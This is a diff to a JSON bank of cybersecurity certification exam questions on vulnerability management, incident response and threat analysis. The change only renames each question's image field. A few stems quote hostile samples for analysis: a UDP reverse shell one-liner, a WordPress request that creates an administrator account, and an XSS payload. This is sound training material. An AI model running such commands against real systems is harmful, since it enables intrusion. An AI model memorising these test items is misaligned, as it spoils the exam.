@@ -2,7 +2,7 @@
     {
         "question": {
             "text": "A recent zero-day vulnerability is being actively exploited, requires no user interaction or privilege escalation, and has a significant impact to confidentiality and integrity but not to availability. Which of the following CVE metrics would be most accurate for this zero-day threat?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -28,7 +28,7 @@
     {
         "question": {
             "text": "Which of the following tools would work best to prevent the exposure of PII outside of an organization?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -54,7 +54,7 @@
     {
         "question": {
             "text": "An organization conducted a web application vulnerability assessment against the corporate website, and the following output was observed:",
-            "image": "images/question3.png",
+            "imageQ": "./images/question3",
             "footer": "Which of the following tuning recommendations should the security analyst share?"
         },
         "choices": [
@@ -80,7 +80,7 @@
     {
         "question": {
             "text": "Which of the following items should be included in a vulnerability scan report? (Choose two.)",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -114,7 +114,7 @@
     {
         "question": {
             "text": "The Chief Executive Officer of an organization recently heard that exploitation of new attacks in the industry was happening approximately 45 days after a patch was released. Which of the following would best protect this organization?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -140,7 +140,7 @@
     {
         "question": {
             "text": "A security analyst recently joined the team and is trying to determine which scripting language is being used in a production script to determine if it is malicious. Given the following script:",
-            "image": "images/question6.png",
+            "imageQ": "./images/question6",
             "footer": "Which of the following scripting languages was used in the script?"
         },
         "choices": [
@@ -166,7 +166,7 @@
     {
         "question": {
             "text": "A company's user accounts have been compromised. Users are also reporting that the company's internal portal is sometimes only accessible through HTTP, other times; it is accessible through HTTPS. Which of the following most likely describes the observed activity?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -192,7 +192,7 @@
     {
         "question": {
             "text": "A security analyst is tasked with prioritizing vulnerabilities for remediation. The relevant company security policies are shown below:\n    Security Policy 1006: Vulnerability Management\n    • The Company shall use the CVSSv3.1 Base Score Metrics (Exploitability and Impact) to prioritize the remediation of security vulnerabilities.\n    • In situations where a choice must be made between confidentiality and availability, the Company shall prioritize confidentiality of data over availability of systems and data.\n    • The Company shall prioritize patching of publicly available systems and services over patching of internally available system.\n    According to the security policy, which of the following vulnerabilities should be the highest priority to patch?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -218,7 +218,7 @@
     {
         "question": {
             "text": "Which of the following will most likely ensure that mission-critical services are available in the event of an incident?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -244,7 +244,7 @@
     {
         "question": {
             "text": "The Chief Information Security Officer wants to eliminate and reduce shadow IT in the enterprise. Several high-risk cloud applications are used that increase the risk to the organization. Which of the following solutions will assist in reducing the risk?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -270,7 +270,7 @@
     {
         "question": {
             "text": "An incident response team receives an alert to start an investigation of an internet outage. The outage is preventing all users in multiple locations from accessing external SaaS resources. The team determines the organization was impacted by a DDoS attack. Which of the following logs should the team review first?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -296,7 +296,7 @@
     {
         "question": {
             "text": "A malicious actor has gained access to an internal network by means of social engineering. The actor does not want to lose access in order to continue the attack. Which of the following best describes the current stage of the Cyber Kill Chain that the threat actor is currently operating in?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -322,7 +322,7 @@
     {
         "question": {
             "text": "An analyst finds that an IP address outside of the company network that is being used to run network and vulnerability scans across external-facing assets. Which of the following steps of an attack framework is the analyst witnessing?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -348,7 +348,7 @@
     {
         "question": {
             "text": "An incident response analyst notices multiple emails traversing the network that target only the administrators of the company. The email contains a concealed URL that leads to an unknown website in another country. Which of the following best describes what is happening? (Choose two.)",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -382,7 +382,7 @@
     {
         "question": {
             "text": "During security scanning, a security analyst regularly finds the same vulnerabilities in a critical application. Which of the following recommendations would best mitigate this problem if applied along the SDLC phase?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -408,7 +408,7 @@
     {
         "question": {
             "text": "An analyst is reviewing a vulnerability report and must make recommendations to the executive team. The analyst finds that most systems can be upgraded with a reboot resulting in a single downtime window. However, two of the critical systems cannot be upgraded due to a vendor appliance that the company does not have access to. Which of the following inhibitors to remediation do these systems and associated vulnerabilities best represent?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -434,7 +434,7 @@
     {
         "question": {
             "text": "The security team reviews a web server for XSS and runs the following Nmap scan:",
-            "image": "images/question17.png",
+            "imageQ": "./images/question17",
             "footer": "Which of the following most accurately describes the result of the scan?"
         },
         "choices": [
@@ -460,7 +460,7 @@
     {
         "question": {
             "text": "Which of the following is the best action to take after the conclusion of a security incident to improve incident response in the future?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -486,7 +486,7 @@
     {
         "question": {
             "text": "A security analyst received a malicious binary file to analyze. Which of the following is the best technique to perform the analysis?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -512,7 +512,7 @@
     {
         "question": {
             "text": "An incident response team found IoCs in a critical server. The team needs to isolate and collect technical evidence for further investigation. Which of the following pieces of data should be collected first in order to preserve sensitive information before isolating the server?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -542,7 +542,7 @@
     {
         "question": {
             "text": "Which of the following security operations tasks are ideal for automation?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -568,7 +568,7 @@
     {
         "question": {
             "text": "An organization has experienced a breach of customer transactions. Under the terms of PCI DSS, which of the following groups should the organization report the breach to?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -594,7 +594,7 @@
     {
         "question": {
             "text": "Which of the following is the best metric for an organization to focus on given recent investments in SIEM, SOAR, and a ticketing system?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": "Which of the following is the best metric for an organization to focus on given recent investments in SIEM, SOAR, and a ticketing system?"
         },
         "choices": [
@@ -620,7 +620,7 @@
     {
         "question": {
             "text": "A company is implementing a vulnerability management program and moving from an on-premises environment to a hybrid IaaS cloud environment. Which of the following implications should be considered on the new hybrid environment?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -646,7 +646,7 @@
     {
         "question": {
             "text": "A security alert was triggered when an end user tried to access a website that is not allowed per organizational policy. Since the action is considered a terminable offense, the SOC analyst collects the authentication logs, web logs, and temporary files, reflecting the web searches from the user's workstation, to build the case for the investigation. Which of the following is the best way to ensure that the investigation complies with HR or privacy policies?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -672,7 +672,7 @@
     {
         "question": {
             "text": "Which of the following is the first step that should be performed when establishing a disaster recovery plan?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -698,7 +698,7 @@
     {
         "question": {
             "text": "A technician identifies a vulnerability on a server and applies a software patch. Which of the following should be the next step in the remediation process?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -724,7 +724,7 @@
     {
         "question": {
             "text": "The analyst reviews the following endpoint log entry:",
-            "image": "images/question28.png",
+            "imageQ": "./images/question28",
             "footer": "Which of the following has occurred?"
         },
         "choices": [
@@ -750,7 +750,7 @@
     {
         "question": {
             "text": "A security program was able to achieve a 30% improvement in MTTR by integrating security controls into a SIEM. The analyst no longer had to jump between tools. Which of the following best describes what the security program did?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -776,7 +776,7 @@
     {
         "question": {
             "text": "Due to reports of unauthorized activity that was occurring on the internal network, an analyst is performing a network discovery. The analyst runs an Nmap scan against a corporate network to evaluate which devices were operating in the environment. Given the following output:",
-            "image": "images/question30.png",
+            "imageQ": "./images/question30",
             "footer": "Which of the following choices should the analyst look at first?"
         },
         "choices": [
@@ -806,7 +806,7 @@
     {
         "question": {
             "text": "When starting an investigation, which of the following must be done first?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -832,7 +832,7 @@
     {
         "question": {
             "text": "Which of the following describes how a CSIRT lead determines who should be communicated with and when during a security incident?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -858,7 +858,7 @@
     {
         "question": {
             "text": "A new cybersecurity analyst is tasked with creating an executive briefing on possible threats to the organization. Which of the following will produce the data needed for the briefing?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -884,7 +884,7 @@
     {
         "question": {
             "text": "An analyst notices there is an internal device sending HTTPS traffic with additional characters in the header to a known-malicious IP in another country. Which of the following describes what the analyst has noticed?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -910,7 +910,7 @@
     {
         "question": {
             "text": "A security analyst is reviewing a packet capture in Wireshark that contains an FTP session from a potentially compromised machine. The analyst sets the following display filter: ftp. The analyst can see there are several RETR requests with 226 Transfer complete responses, but the packet list pane is not showing the packets containing the file transfer itself. Which of the following can the analyst perform to see the entire contents of the downloaded files?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -936,7 +936,7 @@
     {
         "question": {
             "text": "A SOC manager receives a phone call from an upset customer. The customer received a vulnerability report two hours ago: but the report did not have a follow-up remediation response from an analyst. Which of the following documents should the SOC manager review to ensure the team is meeting the appropriate contractual obligations for the customer?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -962,7 +962,7 @@
     {
         "question": {
             "text": "Which of the following phases of the Cyber Kill Chain involves the adversary attempting to establish communication with a successfully exploited target?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -988,7 +988,7 @@
     {
         "question": {
             "text": "A company that has a geographically diverse workforce and dynamic IPs wants to implement a vulnerability scanning method with reduced network traffic. Which of the following would best meet this requirement?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -1014,7 +1014,7 @@
     {
         "question": {
             "text": "A security analyst detects an exploit attempt containing the following command: sh -i >& /dev/udp/10.1.1.1/4821 0>$l",
-            "imgPath": "",
+            "imageQ": "",
             "footer": "Which of the following is being attempted?"
         },
         "choices": [
@@ -1040,7 +1040,7 @@
     {
         "question": {
             "text": "An older CVE with a vulnerability score of 7.1 was elevated to a score of 9.8 due to a widely available exploit being used to deliver ransomware. Which of the following factors would an analyst most likely communicate as the reason for this escalation?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -1066,7 +1066,7 @@
     {
         "question": {
             "text": "An analyst is reviewing a vulnerability report for a server environment with the following entries:",
-            "image": "images/question41.png",
+            "imageQ": "./images/question41",
             "footer": "Which of the following systems should be prioritized for patching first?"
         },
         "choices": [
@@ -1092,7 +1092,7 @@
     {
         "question": {
             "text": "A company is in the process of implementing a vulnerability management program, and there are concerns about granting the security team access to sensitive data. Which of the following scanning methods can be implemented to reduce the access to systems while providing the most accurate vulnerability scan results?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -1118,7 +1118,7 @@
     {
         "question": {
             "text": "A security analyst is trying to identify anomalies on the network routing. Which of the following functions can the analyst use on a shell script to achieve the objective most accurately?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -1144,7 +1144,7 @@
     {
         "question": {
             "text": "There are several reports of sensitive information being disclosed via file sharing services. The company would like to improve its security posture against this threat. Which of the following security controls would best support the company in this scenario?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -1170,7 +1170,7 @@
     {
         "question": {
             "text": "Which of the following is the best way to begin preparation for a report titled \"What We Learned\" regarding a recent incident involving a cybersecurity breach?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -1196,7 +1196,7 @@
     {
         "question": {
             "text": "A security analyst is performing an investigation involving multiple targeted Windows malware binaries. The analyst wants to gather intelligence without disclosing information to the attackers. Which of the following actions would allow the analyst to achieve the objective?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -1222,7 +1222,7 @@
     {
         "question": {
             "text": "Which of the following would help to minimize human engagement and aid in process improvement in security operations?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -1248,7 +1248,7 @@
     {
         "question": {
             "text": "After conducting a cybersecurity risk assessment for a new software request, a Chief Information Security Officer (CISO) decided the risk score would be too high. The CISO refused the software request. Which of the following risk management principles did the CISO select?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -1274,7 +1274,7 @@
     {
         "question": {
             "text": "Which of the following is an important aspect that should be included in the lessons-learned step after an incident?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -1300,7 +1300,7 @@
     {
         "question": {
             "text": "The security operations team is required to consolidate several threat intelligence feeds due to redundant tools and portals. Which of the following will best achieve the goal and maximize results?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -1326,7 +1326,7 @@
     {
         "question": {
             "text": "Which of the following would a security analyst most likely use to compare TTPs between different known adversaries of an organization?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -1352,7 +1352,7 @@
     {
         "question": {
             "text": "An analyst is remediating items associated with a recent incident. The analyst has isolated the vulnerability and is actively removing it from the system. Which of the following steps of the process does this describe?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -1378,7 +1378,7 @@
     {
         "question": {
             "text": "Joe, a leading sales person at an organization, has announced on social media that he is leaving his current role to start a new company that will compete with his current employer. Joe is soliciting his current employer's customers. However, Joe has not resigned or discussed this with his current supervisor yet. Which of the following would be the best action for the incident response team to recommend?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -1404,7 +1404,7 @@
     {
         "question": {
             "text": "The Chief Information Security Officer is directing a new program to reduce attack surface risks and threats as part of a zero trust approach. The IT security team is required to come up with priorities for the program. Which of the following is the best priority based on common attack frameworks?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -1430,7 +1430,7 @@
     {
         "question": {
             "text": "During an extended holiday break, a company suffered a security incident. This information was properly relayed to appropriate personnel in a timely manner and the server was up to date and configured with appropriate auditing and logging. The Chief Information Security Officer wants to find out precisely what happened. Which of the following actions should the analyst take first?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -1456,7 +1456,7 @@
     {
         "question": {
             "text": "A systems administrator is reviewing after-hours traffic flows from data-center servers and sees regular outgoing HTTPS connections from one of the servers to a public IP address. The server should not be making outgoing connections after hours. Looking closer, the administrator sees this traffic pattern around the clock during work hours as well. Which of the following is the most likely explanation?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -1486,7 +1486,7 @@
     {
         "question": {
             "text": "New employees in an organization have been consistently plugging in personal webcams despite the company policy prohibiting use of personal devices. The SOC manager discovers that new employees are not aware of the company policy. Which of the following will the SOC manager most likely recommend to help ensure new employees are accountable for following the company policy?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -1512,7 +1512,7 @@
     {
         "question": {
             "text": "An analyst has been asked to validate the potential risk of a new ransomware campaign that the Chief Financial Officer read about in the newspaper. The company is a manufacturer of a very small spring used in the newest fighter jet and is a critical piece of the supply chain for this aircraft. Which of the following would be the best threat intelligence source to learn about this new campaign?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -1538,7 +1538,7 @@
     {
         "question": {
             "text": "An incident response team finished responding to a significant security incident. The management team has asked the lead analyst to provide an after-action report that includes lessons learned. Which of the following is the most likely reason to include lessons learned?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -1564,7 +1564,7 @@
     {
         "question": {
             "text": "A vulnerability management team is unable to patch all vulnerabilities found during their weekly scans. Using the third-party scoring system described below, the team patches the most urgent vulnerabilities:",
-            "image": "images/question60.png",
+            "imageQ": "./images/question60",
             "footer": "Which of the following vulnerabilities should be patched first, given the above third-party scoring system?"
         },
         "choices": [
@@ -1590,7 +1590,7 @@
     {
         "question": {
             "text": "A user downloads software that contains malware onto a computer that eventually infects numerous other systems. Which of the following has the user become?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -1616,7 +1616,7 @@
     {
         "question": {
             "text": "An organization has activated the CSIRT. A security analyst believes a single virtual server was compromised and immediately isolated from the network. Which of the following should the CSIRT conduct next?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -1642,7 +1642,7 @@
     {
         "question": {
             "text": "During an incident, an analyst needs to acquire evidence for later investigation. Which of the following must be collected first in a computer system, related to its volatility level?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -1668,7 +1668,7 @@
     {
         "question": {
             "text": "A security analyst is trying to identify possible network addresses from different source networks belonging to the same company and region. Which of the following shell script functions could help achieve the goal?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -1694,7 +1694,7 @@
     {
         "question": {
             "text": "A security analyst is writing a shell script to identify IP addresses from the same country. Which of the following functions would help the analyst achieve the objective?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -1720,7 +1720,7 @@
     {
         "question": {
             "text": "A security analyst obtained the following table of results from a recent vulnerability assessment that was conducted against a single web server in the environment:",
-            "image": "images/question66.png",
+            "imageQ": "./images/question66",
             "footer": "Which of the following should be completed first to remediate the findings?"
         },
         "choices": [
@@ -1746,7 +1746,7 @@
     {
         "question": {
             "text": "While reviewing web server logs, an analyst notices several entries with the same time stamps, but all contain odd characters in the request line. Which of the following steps should be taken next?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -1772,7 +1772,7 @@
     {
         "question": {
             "text": "A security team conducts a lessons-learned meeting after struggling to determine who should conduct the next steps following a security event. Which of the following should the team create to address this issue?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -1798,7 +1798,7 @@
     {
         "question": {
             "text": "A cybersecurity analyst notices unusual network scanning activity coming from a country that the company does not do business with. Which of the following is the best mitigation technique?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -1824,7 +1824,7 @@
     {
         "question": {
             "text": "An analyst has received an IPS event notification from the SIEM stating an IP address, which is known to be malicious, has attempted to exploit a zero-day vulnerability on several web servers. The exploit contained the following snippet:\n    /wp-json/trx_addons/V2/get/sc_layout?sc=wp_insert_user&role=administrator",
-            "imgPath": "",
+            "imageQ": "",
             "footer": "Which of the following controls would work best to mitigate the attack represented by this snippet?"
         },
         "choices": [
@@ -1850,7 +1850,7 @@
     {
         "question": {
             "text": "A penetration tester submitted data to a form in a web application, which enabled the penetration tester to retrieve user credentials. Which of the following should be recommended for remediation of this application vulnerability?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -1876,7 +1876,7 @@
     {
         "question": {
             "text": "A cybersecurity team lead is developing metrics to present in the weekly executive briefs. Executives are interested in knowing how long it takes to stop the spread of malware that enters the network. Which of the following metrics should the team lead include in the briefs?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -1902,7 +1902,7 @@
     {
         "question": {
             "text": "An employee accessed a website that caused a device to become infected with invasive malware. The incident response analyst has:\n    • created the initial evidence log.\n    • disabled the wireless adapter on the device.\n    • interviewed the employee, who was unable to identify the website that was accessed.\n    • reviewed the web proxy traffic logs.",
-            "imgPath": "",
+            "imageQ": "",
             "footer": "Which of the following should the analyst do to remediate the infected device?"
         },
         "choices": [
@@ -1928,7 +1928,7 @@
     {
         "question": {
             "text": "A cloud team received an alert that unauthorized resources were being auto-provisioned. After investigating, the team suspects that cryptomining is occurring. Which of the following indicators would most likely lead the team to this conclusion?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -1954,7 +1954,7 @@
     {
         "question": {
             "text": "A company’s security team is updating a section of the reporting policy that pertains to inappropriate use of resources (e.g., an employee who installs cryptominers on workstations in the office). Besides the security team, which of the following groups should the issue be escalated to first in order to comply with industry best practices?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -1980,7 +1980,7 @@
     {
         "question": {
             "text": "Given the following CVSS string:\n    CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
-            "imgPath": "",
+            "imageQ": "",
             "footer": "Which of the following attributes correctly describes this vulnerability?"
         },
         "choices": [
@@ -2006,7 +2006,7 @@
     {
         "question": {
             "text": "A cryptocurrency service company is primarily concerned with ensuring the accuracy of the data on one of its systems. A security analyst has been tasked with prioritizing vulnerabilities for remediation for the system. The analyst will use the following CVSSv3.1 impact metrics for prioritization:",
-            "image": "images/question77.png",
+            "imageQ": "./images/question77",
             "footer": "Which of the following vulnerabilities should be prioritized for remediation?"
         },
         "choices": [
@@ -2032,7 +2032,7 @@
     {
         "question": {
             "text": "Patches for two highly exploited vulnerabilities were released on the same Friday afternoon. Information about the systems and vulnerabilities is shown in the tables below:",
-            "image": "images/question78.png",
+            "imageQ": "./images/question78",
             "footer": "Which of the following should the security analyst prioritize for remediation?"
         },
         "choices": [
@@ -2058,7 +2058,7 @@
     {
         "question": {
             "text": "A security analyst must preserve a system hard drive that was involved in a litigation request. Which of the following is the best method to ensure the data on the device is not modified?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -2084,7 +2084,7 @@
     {
         "question": {
             "text": "Which of the following best describes the goal of a tabletop exercise?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -2110,7 +2110,7 @@
     {
         "question": {
             "text": "A virtual web server in a server pool was infected with malware after an analyst used the internet to research a system issue. After the server was rebuilt and added back into the server pool, users reported issues with the website, indicating the site could not be trusted. Which of the following is the most likely cause of the server issue?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -2136,7 +2136,7 @@
     {
         "question": {
             "text": "A zero-day command injection vulnerability was published. A security administrator is analyzing the following logs for evidence of adversaries attempting to exploit the vulnerability:",
-            "image": "images/question82.png",
+            "imageQ": "./images/question82",
             "footer": "Which of the following log entries provides evidence of the attempted exploit?"
         },
         "choices": [
@@ -2162,7 +2162,7 @@
     {
         "question": {
             "text": "A security analyst needs to ensure that systems across the organization are protected based on the sensitivity of the content each system hosts. The analyst is working with the respective system owners to help determine the best methodology that seeks to promote confidentiality, availability, and integrity of the data being hosted. Which of the following should the security analyst perform first to categorize and prioritize the respective systems?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -2188,7 +2188,7 @@
     {
         "question": {
             "text": "A security analyst is reviewing the following alert that was triggered by FIM on a critical system:",
-            "image": "images/question84.png",
+            "imageQ": "./images/question84",
             "footer": "Which of the following best describes the suspicious activity that is occurring?"
         },
         "choices": [
@@ -2214,7 +2214,7 @@
     {
         "question": {
             "text": "Which of the following best describes the document that defines the expectation to network customers that patching will only occur between 2:00 a.m. and 4:00 a.m.?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -2240,7 +2240,7 @@
     {
         "question": {
             "text": "A cybersecurity analyst is reviewing SIEM logs and observes consistent requests originating from an internal host to a blocklisted external server. Which of the following best describes the activity that is taking place?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -2266,7 +2266,7 @@
     {
         "question": {
             "text": "An incident response team is working with law enforcement to investigate an active web server compromise. The decision has been made to keep the server running and to implement compensating controls for a period of time. The web service must be accessible from the internet via the reverse proxy and must connect to a database server. Which of the following compensating controls will help contain the adversary while meeting the other requirements? (Choose two).",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -2300,7 +2300,7 @@
     {
         "question": {
             "text": "An incident response team member is triaging a Linux server. The output is shown below:",
-            "image": "images/question88.png",
+            "imageQ": "./images/question88",
             "footer": "Which of the following is the adversary most likely trying to do?"
         },
         "choices": [
@@ -2326,7 +2326,7 @@
     {
         "question": {
             "text": "A SOC analyst identifies the following content while examining the output of a debugger command over a client-server application:\n    getConnection(database01,'alpha' ,'AxTv.127GdCx94GTd');",
-            "imgPath": "",
+            "imageQ": "",
             "footer": "Which of the following is the most likely vulnerability in this system?"
         },
         "choices": [
@@ -2352,7 +2352,7 @@
     {
         "question": {
             "text": "A technician is analyzing output from a popular network mapping tool for a PCI audit:",
-            "image": "images/question90.png",
+            "imageQ": "./images/question90",
             "footer": "Which of the following best describes the output?"
         },
         "choices": [
@@ -2378,7 +2378,7 @@
     {
         "question": {
             "text": "A managed security service provider is having difficulty retaining talent due to an increasing workload caused by a client doubling the number of devices connected to the network. Which of the following would best aid in decreasing the workload without increasing staff?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -2404,7 +2404,7 @@
     {
         "question": {
             "text": "An employee is suspected of misusing a company-issued laptop. The employee has been suspended pending an investigation by human resources. Which of the following is the best step to preserve evidence?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -2430,7 +2430,7 @@
     {
         "question": {
             "text": "An analyst receives threat intelligence regarding potential attacks from an actor with seemingly unlimited time and resources. Which of the following best describes the threat actor attributed to the malicious activity?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -2456,7 +2456,7 @@
     {
         "question": {
             "text": "A systems analyst is limiting user access to system configuration keys and values in a Windows environment. Which of the following describes where the analyst can find these configuration items?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -2482,7 +2482,7 @@
     {
         "question": {
             "text": "While reviewing web server logs, a security analyst found the following line:\n    < IMG SRC='vbscript:msgbox('test')' >",
-            "imgPath": "",
+            "imageQ": "",
             "footer": "Which of the following malicious activities was attempted?"
         },
         "choices": [
@@ -2508,7 +2508,7 @@
     {
         "question": {
             "text": "A security analyst at a company called ACME Commercial notices there is outbound traffic to a host IP that resolves to https://office365password.acme.co. The site’s standard VPN logon page is www.acme.com/logon. Which of the following is most likely true?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -2534,7 +2534,7 @@
     {
         "question": {
             "text": "A security analyst is performing vulnerability scans on the network. The analyst installs a scanner appliance, configures the subnets to scan, and begins the scan of the network. Which of the following would be missing from a scan performed with this configuration?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -2560,7 +2560,7 @@
     {
         "question": {
             "text": "A security analyst discovers an LFI vulnerability that can be exploited to extract credentials from the underlying host. Which of the following patterns can the security analyst use to search the web server logs for evidence of exploitation of that particular vulnerability?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -2586,7 +2586,7 @@
     {
         "question": {
             "text": "A company is in the process of implementing a vulnerability management program. Which of the following scanning methods should be implemented to minimize the risk of OT/ICS devices malfunctioning due to the vulnerability identification process?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
@@ -2612,7 +2612,7 @@
     {
         "question": {
             "text": "A company receives a penetration test report summary from a third party. The report summary indicates a proxy has some patches that need to be applied. The proxy is sitting in a rack and is not being used, as the company has replaced it with a new one. The CVE score of the vulnerability on the proxy is a 9.8. Which of the following best practices should the company follow with this proxy?",
-            "imgPath": "",
+            "imageQ": "",
             "footer": ""
         },
         "choices": [
